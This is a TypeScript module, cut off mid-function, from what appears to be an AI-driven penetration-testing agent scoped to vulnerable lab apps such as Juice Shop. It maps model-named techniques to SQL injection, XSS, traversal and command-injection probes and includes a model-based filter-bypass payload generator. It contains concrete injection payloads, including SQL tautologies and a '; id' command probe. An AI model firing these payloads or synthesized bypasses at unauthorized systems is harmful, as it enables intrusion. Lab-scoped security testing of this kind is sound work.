import { bus } from "../events/bus.js";
import type { Severity } from "../events/types.js";
import type { GraphQLProbe, SoapProbe } from "../recon/index.js";
import type { Session, SessionRequest, SessionResponse } from "../session/index.js";
import { type Artifact, type AttackContext, latestArtifact, type SeedStep } from "./context.js";

export interface AttemptResult {
  /** The attempt confirmed a vuln / reached an objective signal. */
  ok: boolean;
  note: string;
  status?: number;
  /** Failure was transient (transport error / 5xx) — safe to retry. */
  transient?: boolean;
  /** Whether the technique even applies here (false on 404 / hard block). */
  applicable?: boolean;
  evidence?: { request: string; response: string; note?: string };
  /** Overrides the class default basis when THIS attempt confirmed differently
   *  (e.g. an impact-confirmed boolean dump vs. the class's signal default). */
  basis?: string;
  /** Artifacts this step discovered, fed into the world-model for later steps. */
  discovered?: Artifact[];
  /** Follow-up steps this confirmation seeds — the chain grows from here. */
  next?: SeedStep[];
  /** Objective reached — kept DISTINCT from `ok` (a finding is not the goal). */
  reachesObjective?: boolean;
  /** Label of the artifact this step consumed from a prior step (for evidence linking). */
  consumed?: string;
}

export interface AttemptOpts {
  /** Route through the stateful session (vs. a raw tool call). */
  useSession: boolean;
  /** The specific in-scope URL this attempt targets. */
  url: string;
  /** HTTP method of the targeted endpoint, when recon recorded a form. */
  method?: "GET" | "POST";
  /** Named injectable form fields recon captured, for a form-aware probe. */
  fields?: string[];
  /** Every named control with its default value, to resubmit the complete form. */
  formData?: Record<string, string>;
  /** A GraphQL Query-field argument to inject into, when this is a GraphQL endpoint. */
  graphql?: GraphQLProbe;
  /** A SOAP operation parameter to inject into, when this is a SOAP/WSDL endpoint. */
  soap?: SoapProbe;
  /** The session carries operator-provided credentials (an authenticated run).
   *  Reaching an authorized resource is then expected, not broken access. */
  authenticated?: boolean;
  /** Lowercased tokens from the objective used as a generic success signal. */
  objectiveHint?: string[];
  /** The run's world-model — artifacts earlier steps discovered. */
  context?: AttackContext;
  /** An unauthenticated baseline session, for the two-principal broken-access-
   *  control differential: the same gated surface, requested with no credentials,
   *  must be denied for a reached surface to count as a boundary cross. */
  baseline?: Session;
  /** A higher-privilege principal, for the broken-access-control differential:
   *  when it also serves the surface, the surface is confirmed shared privileged
   *  functionality rather than the primary principal's own per-user resource. */
  elevated?: Session;
  /** Model-backed filter-bypass payload synthesis. The deterministic battery
   *  injects a FIXED payload set; an input filter that neutralizes those (an
   *  OR/AND blacklist, a space/comment stripper, a WAF) defeats the floor but not
   *  a payload reasoned from the filter's observed behaviour. When present, a
   *  failed SQLi check that still sees the parameter reacting to input asks the
   *  model for bypass candidates — which are then confirmed by the SAME
   *  benign-anchored differential, so a hallucinated payload that does not
   *  actually work yields no finding. This is the one place model reasoning can
   *  confirm a vuln the fixed floor cannot. */
  payloadSmith?: PayloadSmith;
}

/** A description of a filtered injection point, handed to the model so it can
 *  reason about the filter and propose bypasses. Carries no secrets — only the
 *  field name, the request shape, and short observations of how fixed probes
 *  were neutralized. */
export interface FilterBrief {
  field: string;
  url: string;
  method: "GET" | "POST";
  /** What the fixed probes did and how the app reacted (e.g. "fixed `OR 1=1`
   *  returned the no-row page; `'\"` raised no DB error"). */
  observations: string[];
}

/** Returns candidate boolean-oracle payload PAIRS: each `t` should make the
 *  underlying query TRUE (return the row) and `f` FALSE (suppress it), crafted
 *  to survive the described filter. The engine confirms them against the app's
 *  own true/false fingerprint; it never trusts them on the model's word. */
export type PayloadSmith = (brief: FilterBrief) => Promise<Array<{ t: string; f: string }>>;

/**
 * Chain technique names the loop seeds deterministically (independent of the
 * model, so the flagship chain runs even cold / quota-dead). Matched by exact
 * name before the free-form keyword classifier.
 */
export const T_AUTH_BYPASS = "SQL Injection — authentication bypass";
export const T_ADMIN_ACCESS = "Authenticated admin access";

/**
 * Active fingerprinting seed. Routed through the keyword classifier (not an
 * exact chain match) to the error-based SQL-injection check: the quote probe
 * trips a DB error page that leaks the server framework and version, which the
 * loop re-grounds live. Runs first, deterministically, so the attack surface is
 * expanded before planner-driven exploitation begins.
 */
export const T_SQLI_DISCLOSURE = "SQL Injection — stack disclosure";

/**
 * A single exploit attempt. This is the one deliberately small, lab-specific
 * surface: hand-written attempts against the authorized target go HERE, each
 * narrow and readable. It is NOT a generalized exploit toolkit and embeds no
 * payload library — that is an anti-pattern for an authorized agent.
 *
 * `attempt` dispatches on the (free-form, LLM-authored) `technique` string: a
 * small switch of per-technique, non-destructive checks, each firing `ok: true`
 * only when its OWN signal is observed, so a grounded candidate and an
 * ungrounded one no longer share the same outcome. Anything unrecognized falls
 * back to the baseline access probe, so nothing regresses.
 *
 * Every check is a safe, read-only probe: it routes a gated request through the
 * session and reports a structured, interpretable result (confirmed / transient
 * / not-applicable) for the recover loop. None mutate target state.
 */
export async function attempt(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  // Chain steps are matched by exact name first: they carry state across steps
  // (consume/produce artifacts) rather than being a one-shot keyword probe.
  if (technique === T_AUTH_BYPASS) return authBypassCheck(session, technique, opts);
  if (technique === T_ADMIN_ACCESS) return authenticatedAdminCheck(session, technique, opts);

  switch (classify(technique)) {
    case "sqli":
      return sqlInjectionCheck(session, technique, opts);
    case "xss":
      return xssCheck(session, technique, opts);
    case "csrf":
      return csrfCheck(session, technique, opts);
    case "traversal":
      return pathTraversalCheck(session, technique, opts);
    case "cmdi":
      return commandInjectionCheck(session, technique, opts);
    case "bac":
      // A broken-access-intent technique may reach the known admin surface.
      return accessControlCheck(session, technique, opts, true);
    default:
      // The true fallback: baseline access probe of opts.url only, so an
      // unrecognized technique never auto-confirms off another surface.
      return accessControlCheck(session, technique, opts, false);
  }
}

type Kind = "sqli" | "xss" | "csrf" | "traversal" | "cmdi" | "bac" | "fallback";

/** Map free-form LLM technique text onto a check via normalized keywords. */
function classify(technique: string): Kind {
  const t = technique.toLowerCase();
  if (t.includes("sql")) return "sqli"; // "SQL injection", "SQLi", "blind SQL"
  if (t.includes("xss") || t.includes("cross-site scripting") || t.includes("cross site scripting"))
    return "xss";
  if (t.includes("csrf") || t.includes("cross-site request") || t.includes("cross site request"))
    return "csrf";
  if (
    t.includes("traversal") ||
    t.includes("file inclusion") ||
    t.includes("lfi") ||
    t.includes("rfi")
  )
    return "traversal";
  if (
    t.includes("command inject") ||
    t.includes("os command") ||
    t.includes("rce") ||
    t.includes("remote code") ||
    t.includes("code execution")
  )
    return "cmdi";
  if (
    t.includes("access") || // "broken access control", the loop's "access-probe"
    t.includes("idor") ||
    t.includes("insecure direct object") ||
    t.includes("authorization") ||
    t.includes("auth bypass") ||
    t.includes("privilege") ||
    t.includes("forced brows")
  )
    return "bac";
  return "fallback";
}

/** Severity, CVSS, and remediation for a confirmed finding of a given class. */
export interface FindingProfile {
  name: string;
  /** CWE identifier for the weakness class, e.g. "CWE-89". */
  cwe: string;
  severity: Severity;
  cvss: string;
  cvssScore: number;
  /** How a finding of this class is confirmed — signal observed vs impact
   *  actually achieved — stated plainly so the report never over-claims. */
  basis: string;
  remediation: string;
}

const PROFILES: Record<Kind, FindingProfile> = {
  sqli: {
    name: "SQL Injection",
    cwe: "CWE-89",
    severity: "critical",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 9.8,
    basis:
      "Signal-based: a database engine error was returned when a single unmatched quote was submitted, proving unsanitized input reaches the SQL parser. No data was extracted and no rows were altered.",
    remediation:
      "Use parameterized queries or prepared statements for every database access and never concatenate untrusted input into SQL. Add allow-list input validation and run the application under a least-privilege database account.",
  },
  xss: {
    name: "Reflected Cross-Site Scripting (XSS)",
    cwe: "CWE-79",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    cvssScore: 7.4,
    basis:
      "Signal-based: a unique injected marker was reflected into the response without output encoding. Script execution was not driven in a headless browser, so exploitability is inferred from the unencoded reflection, not observed.",
    remediation:
      "Context-encode all untrusted output and rely on the framework's auto-escaping, serve a strict Content-Security-Policy, and treat any raw-HTML sink as a mandatory review gate.",
  },
  csrf: {
    name: "Cross-Site Request Forgery (CSRF)",
    cwe: "CWE-352",
    severity: "medium",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cvssScore: 5.4,
    basis:
      "Signal-based: a state-changing endpoint accepted a cross-origin-shaped request with no anti-CSRF token present. A full cross-site forgery was not driven end-to-end.",
    remediation:
      "Set SameSite=Lax or Strict on session cookies, require a per-session anti-CSRF token on every state-changing request, and verify the Origin or Referer header server-side.",
  },
  traversal: {
    name: "Path Traversal / File Inclusion",
    cwe: "CWE-22",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cvssScore: 7.5,
    basis:
      "Impact-confirmed: a traversal sequence returned the contents of a file outside the web root, so unauthorized read access was actually achieved (read-only — a single known file was retrieved).",
    remediation:
      "Canonicalize paths and confine file access to an allow-listed base directory, reject directory-traversal sequences after normalization, and never hand user input to filesystem APIs directly.",
  },
  cmdi: {
    name: "OS Command Injection",
    cwe: "CWE-78",
    severity: "critical",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 9.8,
    basis:
      "Impact-confirmed: a benign appended command (`; id`) returned its output in the response, proving arbitrary command execution. The probe is read-only and ran no destructive command.",
    remediation:
      "Never pass user input to a shell; invoke processes with an argument array and no shell interpolation, apply strict allow-list validation, and run with least privilege.",
  },
  bac: {
    name: "Broken Access Control",
    cwe: "CWE-862",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cvssScore: 7.5,
    basis:
      "Impact-confirmed: a resource that should require authorization was returned to a principal that lacks it, so the access-control gap was actually exercised (read-only).",
    remediation:
      "Enforce server-side authorization on every request against the authenticated principal, deny by default, and never rely on unlinked or obscure URLs for protection.",
  },
  fallback: {
    name: "Security Exposure",
    cwe: "CWE-200",
    severity: "medium",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvssScore: 5.3,
    basis:
      "Signal-based: an anomalous response disclosed information a hardened surface would withhold. The exposure is reported for manual confirmation, not claimed as an exploited impact.",
    remediation:
      "Manually confirm this exposure, verify server-side authorization and input handling on the affected surface, and add a regression test that keeps it closed.",
  },
};

/**
 * Map a confirmed attempt onto a client-ready finding profile: a severity and
 * CVSS vector argued from the vulnerability class, plus concrete remediation.
 * This is what turns a raw `ok: true` into something a consultant would sign —
 * never a hard-coded "high". A cited CVE appends a patch directive.
 */
const CHAIN_PROFILES: Record<string, FindingProfile> = {
  [T_AUTH_BYPASS]: {
    name: "SQL Injection — Authentication Bypass",
    cwe: "CWE-89",
    severity: "critical",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 9.8,
    basis:
      "Impact-confirmed: the injected predicate established an authenticated session without valid credentials, so authentication was actually bypassed. The probe only reads the auth table — no credential is altered and no account is locked.",
    remediation:
      "Use parameterized queries for the authentication lookup so credentials can never alter query structure, and never build the login SQL by string concatenation. Add server-side rate limiting and generic auth-failure responses.",
  },
  [T_ADMIN_ACCESS]: {
    name: "Broken Access Control — Privilege Escalation",
    cwe: "CWE-269",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    cvssScore: 8.1,
    basis:
      "Impact-confirmed: the session from the bypass step reached an admin-only resource, so the privilege boundary was actually crossed (read-only access to the restricted surface).",
    remediation:
      "Enforce server-side role checks on every admin resource against the authenticated principal, deny by default, and reject tokens whose subject lacks the admin role instead of trusting a valid signature alone.",
  },
};

export function findingProfile(technique: string, cve?: string): FindingProfile {
  const base = CHAIN_PROFILES[technique] ?? PROFILES[classify(technique)];
  if (!cve) return base;
  return {
    ...base,
    remediation: `${base.remediation} Patch the affected component to a fixed release that resolves ${cve}.`,
  };
}

// --- shared transport layer ------------------------------------------------

type Base = { status: number; evidence: { request: string; response: string } };

/**
 * Upper bound on the response body a signal check scans. Detection must read the
 * whole page, not a head slice: a large app wraps its real output in a big nav/
 * framework shell, so a reflected marker, command output or leaked file lands far
 * below the fold (Mutillidae reflects DNS-lookup output ~49 KB into a 52 KB page).
 * A head-only scan is a silent false negative that scales with page size, not with
 * the vuln. Kept finite so a pathological multi-MB body can't stall a regex.
 */
const DETECT_MAX = 512_000;

/** A sent request, already classified against the stable transport contract. */
type Sent =
  | { kind: "result"; result: AttemptResult }
  | { kind: "ok"; res: SessionResponse; snippet: string; scan: string; base: Base };

/**
 * Perform one gated request, applying only the transport/scope contract. The
 * status contract (5xx / 404) is left to the caller, because a check like
 * error-based SQLi needs to read a 5xx body before it is written off as
 * transient. Always returns the response on a successful round-trip.
 */
async function rawSend(session: Session, req: SessionRequest, label?: string): Promise<Sent> {
  const request = label ?? `${req.method ?? "GET"} ${req.url}`;
  let res: SessionResponse;
  try {
    res = await session.request(req);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    const blocked = msg.startsWith("blocked by scope gate");
    return {
      kind: "result",
      result: {
        ok: false,
        note: blocked ? "blocked by gate" : `transport error: ${msg}`,
        transient: !blocked,
        applicable: !blocked,
      },
    };
  }

  const snippet = res.body.slice(0, 2000);
  const scan = res.body.length <= DETECT_MAX ? res.body : res.body.slice(0, DETECT_MAX);
  const base = { status: res.status, evidence: { request, response: snippet } };
  return { kind: "ok", res, snippet, scan, base };
}

/** The stable status contract: 5xx → transient, 404/405 → not applicable. */
function statusResult(res: SessionResponse, base: Base): AttemptResult | undefined {
  if (res.status >= 500) {
    return {
      ok: false,
      note: `server error ${res.status}`,
      transient: true,
      applicable: true,
      ...base,
    };
  }
  if (res.status === 404 || res.status === 405) {
    return { ok: false, note: `absent (${res.status})`, applicable: false, ...base };
  }
  return undefined;
}

/**
 * Perform one gated request and apply the loop-wide contract uniformly:
 * transport/scope error, 5xx (transient), 404/405 (not applicable). Returns
 * either a terminal `result` or the usable response for a per-technique signal.
 */
async function send(session: Session, req: SessionRequest, label?: string): Promise<Sent> {
  const sent = await rawSend(session, req, label);
  if (sent.kind === "result") return sent;
  const terminal = statusResult(sent.res, sent.base);
  return terminal ? { kind: "result", result: terminal } : sent;
}

/**
 * Append a query parameter without clobbering an existing query string.
 *
 * `URLSearchParams` encodes a space as `+`. A form-decoding stack (PHP, Express)
 * turns `+` back into a space, but an app with a RAW query parser (Python's
 * `http.server`, as in DSVW) does not — so a space-bearing payload like
 * `' OR '1'='1` arrives as `'+OR+'1'='1` and the injection misfires. `%20` is
 * decoded to a space by every parser, and form stacks accept it identically, so
 * we emit `%20` for spaces in the serialized query — transparent to every lab
 * already validated, correct on the raw-query ones too. (See COLD_RUN.md, DSVW.)
 */
function withParam(url: string, key: string, value: string): string {
  try {
    const u = new URL(url);
    u.searchParams.set(key, value);
    return `${u.origin}${u.pathname}${u.search.replace(/\+/g, "%20")}${u.hash}`;
  } catch {
    const sep = url.includes("?") ? "&" : "?";
    return `${url}${sep}${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
  }
}

/** True when the URL is the bare site root — no path and no query to probe. */
function isRoot(url: string): boolean {
  try {
    const u = new URL(url);
    return (u.pathname === "/" || u.pathname === "") && u.search === "";
  } catch {
    return false;
  }
}

// An inherently-public authentication-entry page — login, registration, password
// recovery. Authorization is never expected on these, so serving one to an
// anonymous caller is correct behavior, NOT broken access control. Matched by URL
// path (not body), so a snippet that truncates before the login form — leaving
// only a <title> that happens to echo a generic objective word like
// "application" — can never be mistaken for a reached objective. This closes the
// false "Impact-confirmed BAC" the DVNA cross-lab run surfaced on /login,
// /register, and /forgotpw. See COLD_RUN.md.
const PUBLIC_AUTH_PATH =
  /(?:^|\/)(?:log[-_]?in|sign[-_]?in|sign[-_]?up|register|registration|forgot(?:[-_]?pw|[-_]?password)?|reset(?:[-_]?pw|[-_]?password)?|password\/(?:forgot|reset))\/?$/i;

function isPublicAuthEntry(url: string): boolean {
  try {
    return PUBLIC_AUTH_PATH.test(new URL(url).pathname);
  } catch {
    return false;
  }
}

// A privilege-denoting surface: an administrative, management, or configuration
// area a normal or anonymous principal should not reach. Broken access control is
// confirmed only when a surface like this is served without proper authorization —
// NOT merely because some reachable page echoes an objective word. A public
// catalog, search, contact, or login page is not broken access control, and
// flagging every such page was a systematic false positive a multi-lab run
// surfaced (BodgeIt, VAmPI, bWAPP). Matched on the URL (path + query) so page
// chrome — a nav "Admin" link on every page — cannot trip it.
const PRIVILEGED_SURFACE =
  /(?:^|[/._?&=-])(?:admin|administrator|superuser|manage|management|console|config|configuration|internal|dashboard|privileg)/i;

function isPrivilegedSurface(url: string): boolean {
  try {
    const u = new URL(url);
    return PRIVILEGED_SURFACE.test(u.pathname + u.search);
  } catch {
    return false;
  }
}

// Lab-specific surfaces for the authorized first target (OWASP Juice Shop).
// This file is the one deliberately lab-specific surface (see the header), so
// the known endpoints live here. A hypothesis candidate reaches `attempt` with
// only the site root as its probe URL (the loop's default), so when handed the
// root we steer each technique to the surface where its signal actually lives;
// a more specific in-scope URL (e.g. one recon discovered) is used verbatim.
const SEARCH_SURFACE = "/rest/products/search";
const ADMIN_CONFIG_SURFACE = "/rest/admin/application-configuration";
const LOGIN_SURFACE = "/rest/user/login";
const USERS_SURFACE = "/api/Users";

/** When `url` is the bare root, retarget to a known in-scope surface `path`. */
function surfaceFor(url: string, path: string): string {
  if (!isRoot(url)) return url;
  try {
    return new URL(path, new URL(url).origin).toString();
  } catch {
    return url;
  }
}

// --- per-technique checks --------------------------------------------------

// A LEAKED DATABASE ERROR — an actual engine/driver error signature, not the
// topic word "SQL". The bare word matched any page that merely *mentions* SQL — a
// nav link reading "SQL Injection", a security-teaching app's lesson titles
// ("1.sql.injection.title") — which, scanned in a rendered SPA DOM, produced a
// critical false positive on WebGoat. Each alternative below is text a database or
// its driver emits on a parse/execution failure (MySQL/MariaDB, SQLite, Postgres,
// Oracle, SQL Server, and Python/Java driver exception classes), so the signal is
// the error, not the subject. A benign-control differential (signalIsPayloadCaused)
// backs this up: even a matched string must be absent from an ordinary request.
const SQL_ERROR =
  /error in your (?:sql|mysql) syntax|warning:\s*(?:mysqli?|pg|oci8?|sqlsrv|sqlite)_|mysqli?_(?:fetch|num_rows|query)|supplied argument is not a valid mysql|unterminated quoted string|quoted string not properly terminated|unclosed quotation mark|ORA-\d{3,}|SQLSTATE\[|SQLITE_ERROR|(?:sqlite3?|sqlalchemy|psycopg2?)[.\w]*error|\b(?:operational|programming|integrity)error\b|org\.postgresql|org\.h2\.|com\.mysql|psql:|unrecognized token|no such column|near ["']|syntax error at or near|incorrect syntax near/i;

// A POSIX shell's own parse error on an unbalanced quote — `/bin/sh: 1: Syntax
// error: Unterminated quoted string` — shares the phrase "unterminated quoted
// string" with SQL_ERROR above. At an OS-command-injection sink (a `dig`/`nslookup`
// shell-out), the error-based SQLi quote probe therefore trips SQL_ERROR on a shell
// message, mislabelling the command-injection sink as error-based SQLi. The shell
// prefix (`/bin/sh:`, `sh: <n>:`, `command not found`) is text no database driver
// emits, so its presence rules the error shell-caused and the SQLi signal is withheld.
const SHELL_ERROR =
  /\/bin\/(?:sh|bash|dash|zsh):|(?:^|[\s>])(?:ba|da|z)?sh: \d+: |: command not found|cannot execute binary file/im;

// A framework/version banner leaked on an error page — e.g. Juice Shop's 500
// page titled "OWASP Juice Shop (Express ^4.22.1)". The parenthetical names the
// server framework and its version: a fresh fingerprint the quiet surface never
// exposed, pried loose only once an injection forced an error.
const FRAMEWORK_BANNER = /\(([A-Za-z][\w.-]*?)\s+\^?v?(\d[\w.]*)\)/;

/** Extract a leaked framework banner from a response as a fingerprint artifact. */
function bannerArtifact(snippet: string, from: string): Artifact | undefined {
  const m = snippet.match(FRAMEWORK_BANNER);
  if (!m?.[1] || !m[2]) return undefined;
  return {
    kind: "fingerprint",
    value: `${m[1]}@${m[2]}`,
    label: `${m[1]} ${m[2]} (leaked by an error page)`,
    from,
  };
}

/**
 * SQL injection — error-based, non-destructive: append a quote-pair that closes
 * both single- and double-quoted string contexts and look for a leaked DB
 * error. Read-only; it provokes a parse error, never a write. The leaked error
 * often rides a 5xx, so this check reads the body BEFORE the status contract —
 * a DB error in a 500 is a confirmed finding here, not a transient failure.
 */
const SQLI_TAUTOLOGY = "' OR '1'='1";
const SQLI_FALSE = "' AND '1'='2";

// The same oracle for a NUMERIC (unquoted) context — `WHERE id=<value>`, where a
// quoted payload only yields a parse error. Always-true `0 OR 1=1` matches every
// row; always-false `0 AND 1=1` matches none. In a string context these land as
// literal text (identical results) or error both (no differential), so the pair
// confirms only a genuine numeric injection. SELECT-side, read-only.
//
// Spaces are written as SQL inline comments `/**/` (whitespace to every engine)
// rather than literal spaces: a GET value's spaces serialize to `+`, and an app
// with a raw query parser (Python's http.server, as in DSVW) does NOT decode `+`
// back to a space, so `0+OR+1=1` is invalid SQL and the oracle silently misfired.
// `/**/` carries no space to encode, so the payload survives either parser.
const SQLI_NUM_TRUE = "0/**/OR/**/1=1";
const SQLI_NUM_FALSE = "0/**/AND/**/1=1";

// A value improbable as any real primary key, used to fetch the app's "no-row"
// page when fingerprinting a blind true/false oracle. Purely numeric, so it
// carries no alphabetic token into the fingerprint and no OR/AND for a filter to
// act on.
const NO_ROW_VALUE = "999999999";
// Cap on model-proposed bypass pairs tried per filtered field — bounds cost and
// keeps the confirmation a tight differential.
const MAX_BYPASS_PAIRS = 6;

/** Escape a value for an XML text node, so a SOAP envelope stays well-formed. */
function xmlEscape(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

/**
 * A proxy for "how many records did this query return" — HTML table rows, or, for
 * a JSON response, record objects, or, for a SOAP response, the repeated leaf
 * result elements a service returns for an array. Static page chrome (CSS/JS
 * braces) is NOT counted: JSON objects are tallied only when the body is actually
 * JSON, so a boolean oracle compares data rows, not a page's styling.
 */
function resultShape(body: string): number {
  const rows = (body.match(/<tr\b/gi) ?? []).length;
  const cells = (body.match(/<td\b/gi) ?? []).length;
  const trimmed = body.trimStart();
  const isJson = trimmed.startsWith("[") || trimmed.startsWith("{");
  const jsonObjs = isJson ? (body.match(/\{[^{}]*"[^{}]*\}/g) ?? []).length : 0;
  // A SOAP array response wraps each record in a repeated leaf element
  // (`<tns:string>alice</tns:string>`). Count non-empty leaf text elements — the
  // operation/result wrappers hold child elements, not text, so they are not
  // counted, and an empty result set yields zero. Gated on a SOAP envelope so an
  // ordinary HTML body with a stray `<b>x</b>` never trips this branch.
  const isSoap = /<(?:\w+:)?Envelope[\s>]/i.test(body);
  const soapLeaves = isSoap ? (body.match(/<([\w:]+)>[^<]+<\/\1>/g) ?? []).length : 0;
  return Math.max(rows, Math.floor(cells / 2), jsonObjs, soapLeaves);
}

/**
 * Build a gated request that places `value` at an endpoint's injectable input: a
 * POST into a named form field, a GET into a named field or the endpoint's own
 * query parameter, or — with nothing else to go on — the conventional `q` on the
 * known search surface (the first target's shape).
 */
function injectionRequest(
  opts: AttemptOpts,
  field: string | undefined,
  value: string,
  defaultKey = "q",
): { req: SessionRequest; label: string } {
  // A GraphQL Query-field argument: build `{ field(fixedArgs arg: "payload") sel }`
  // and POST it as a query (never a mutation — read semantics). The payload is
  // escaped as a GraphQL string literal via JSON string escaping.
  if (opts.graphql) {
    const g = opts.graphql;
    const literal = JSON.stringify(value).slice(1, -1);
    const query = `{ ${g.field}(${g.fixedArgs}${g.arg}: "${literal}")${g.selection} }`;
    return {
      req: {
        url: opts.url,
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ query }),
      },
      label: `POST ${opts.url}  graphql ${g.field}(${g.arg})`,
    };
  }
  // A SOAP operation parameter: build a SOAP 1.1 envelope calling `<operation>`
  // with the payload at the target `<param>` and every sibling parameter at a
  // benign default, so the call stays valid. The payload is XML-escaped — the
  // server's XML parser decodes it back before the handler builds its query, so a
  // metacharacter still reaches the sink while the envelope stays well-formed.
  // Always a POST of a read-like operation (recon's allow-list) — read semantics.
  if (opts.soap) {
    const s = opts.soap;
    const el = (name: string, v: string) => `<tns:${name}>${xmlEscape(v)}</tns:${name}>`;
    const params = [
      ...s.fixedParams.filter((p) => p.name !== s.param).map((p) => el(p.name, p.value)),
      el(s.param, value),
    ].join("");
    const body =
      `<?xml version="1.0" encoding="UTF-8"?>` +
      `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" ` +
      `xmlns:tns="${s.namespace}"><soapenv:Body>` +
      `<tns:${s.operation}>${params}</tns:${s.operation}>` +
      `</soapenv:Body></soapenv:Envelope>`;
    return {
      req: {
        url: opts.url,
        method: "POST",
        headers: { "content-type": "text/xml; charset=utf-8", soapaction: `"${s.soapAction}"` },
        body,
      },
      label: `POST ${opts.url}  soap ${s.operation}(${s.param})`,
    };
  }
  // An OpenAPI path parameter ({username}) is injected by substituting the payload
  // into that path segment, with any other template filled by a benign placeholder
  // so the route still resolves. This is always a GET (read semantics).
  if (field && opts.url.includes(`{${field}}`)) {
    const injected = opts.url
      .replace(`{${field}}`, encodeURIComponent(value))
      .replace(/\{[^}]+\}/g, "1");
    return { req: { url: injected }, label: `GET ${injected}` };
  }
  if (opts.method === "POST" && field) {
    // Resubmit the complete form (submit button + sibling fields at their defaults)
    // with the target field replaced, so an app that gates on a submit/sibling field
    // actually processes the request. Falls back to the lone field when nothing else
    // was captured.
    const params = new URLSearchParams(opts.formData ?? {});
    params.set(field, value);
    return {
      req: {
        url: opts.url,
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: params.toString(),
      },
      label: `POST ${opts.url}  ${field}=${value}`,
    };
  }
  // A GET form with other controls (e.g. DVWA's `?id=…&Submit=Submit`): resubmit the
  // whole form in the query string with the target field replaced.
  if (field && opts.formData && Object.keys(opts.formData).length > 1) {
    try {
      const u = new URL(opts.url);
      for (const [k, v] of Object.entries(opts.formData)) if (k !== field) u.searchParams.set(k, v);
      u.searchParams.set(field, value);
      return { req: { url: u.toString() }, label: `GET ${u.toString()}` };
    } catch {
      /* fall through to single-param injection */
    }
  }
  let url = opts.url;
  let key = defaultKey;
  if (field) {
    key = field;
  } else {
    try {
      const existing = [...new URL(opts.url).searchParams.keys()][0];
      if (existing) key = existing;
      else url = surfaceFor(opts.url, SEARCH_SURFACE);
    } catch {
      url = surfaceFor(opts.url, SEARCH_SURFACE);
    }
  }
  const injected = withParam(url, key, value);
  return { req: { url: injected }, label: `GET ${injected}` };
}

// A surface whose name denotes a STATE CHANGE — create/update/delete, uploads,
// checkout, registration. An injection probe reaches these by POST, and POSTing a
// payload into a mutating form writes to the target. That crosses the read-only
// line the safety model draws (SAFETY.md §4), so we never inject into one. A GET
// carries read semantics and is always allowed; the guard only gates POST.
const MUTATING_HINT =
  /(?:create|update|delete|destroy|remove|save|edit|modify|upload|checkout|order|\bbuy\b|\bpay\b|transfer|insert|import|\badd\b|\bnew\b)/i;

function isMutatingSurface(opts: AttemptOpts): boolean {
  if (opts.method !== "POST") return false;
  try {
    if (MUTATING_HINT.test(new URL(opts.url).pathname)) return true;
  } catch {
    /* fall through to field check */
  }
  return (opts.fields ?? []).some((f) => MUTATING_HINT.test(f));
}

// The parameters/fields to probe on this endpoint, bounded so a wide form never
// explodes the step budget. A POST form → its own fields only (its query string is
// routing, not a body input). A GET → the UNION of its captured fields and its
// existing query parameters: a page can carry both an injectable form field (a
// search box) and an injectable router/query param (the LFI-prone `?page=` of a
// router app, or a spec-declared query param), and probing only one masks the
// other. Nothing to go on → a single undefined target, which falls back to the
// conventional key on the search surface (the first target's shape).
function candidateFields(opts: AttemptOpts): Array<string | undefined> {
  if (opts.graphql) return [`${opts.graphql.field}.${opts.graphql.arg}`];
  if (opts.soap) return [`${opts.soap.operation}.${opts.soap.param}`];
  const fields = opts.fields ?? [];
  if (opts.method === "POST") return fields.length > 0 ? fields.slice(0, 3) : [undefined];
  const out: Array<string | undefined> = [...fields];
  try {
    for (const k of new URL(opts.url).searchParams.keys()) {
      if (!out.includes(k)) out.push(k);
    }
  } catch {
    /* fall through */
  }
  if (out.length === 0) return [undefined];
  return out.slice(0, 3);
}

/** A read-only probe that would have to POST into a mutating form is skipped. */
function mutatingSkip(technique: string): AttemptResult {
  return {
    ok: false,
    applicable: false,
    note: `${technique}: target is a state-changing form — skipped to stay read-only`,
  };
}

/**
 * Control differential for a PRESENCE-based signal (a leaked DB error, host-file
 * contents, shell output). The same input is re-sent with a BENIGN value, and the
 * signal counts only if it is ABSENT from that control response. A presence signal
 * proves injection only when it appears in reaction to the payload and NOT in an
 * ordinary request; otherwise the "signal" is the application's own content — a
 * security-teaching app's lesson text, a nav menu naming "SQL Injection", an example
 * `/etc/passwd` printed on the page — which is there regardless of input. This is the
 * precision backstop that caught the WebGoat critical false positive, where
 * `start.mvc` returned byte-identical content for the payload and a benign value. If
 * the control cannot be fetched cleanly we do not let a transient failure suppress a
 * real finding: the payload signal stands.
 */
async function signalIsPayloadCaused(
  session: Session,
  opts: AttemptOpts,
  field: string | undefined,
  benign: string,
  pattern: RegExp,
  defaultKey = "q",
): Promise<boolean> {
  const { req, label } = injectionRequest(opts, field, benign, defaultKey);
  const sent = await rawSend(session, req, label);
  if (sent.kind !== "ok") return true;
  return !pattern.test(sent.scan);
}

/** A benign control value: alphanumeric, no quote/metacharacter, won't trip a sink. */
function benignControlValue(): string {
  return `nf${Math.random().toString(36).slice(2, 8)}`;
}

async function sqlInjectionCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
